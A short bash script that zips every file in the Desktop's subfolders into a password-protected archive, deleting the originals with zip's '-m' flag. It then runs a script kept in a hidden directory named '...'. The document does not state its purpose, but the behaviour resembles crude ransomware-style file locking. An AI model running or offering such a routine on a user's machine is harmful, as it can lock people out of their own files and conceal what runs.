#!/bin/bash
cd $HOME/デスクトップ
FILENAME=/tmp/encrypt.$$
ls -1 */* > $FILENAME 2>/dev/null
if [ -s $FILENAME ]; then
        zip -m -q -e $HOME/デスクトップ/encrypted.zip -r --password=$1 */*
        $HOME/.../hello.sh
fi
rm $FILENAME
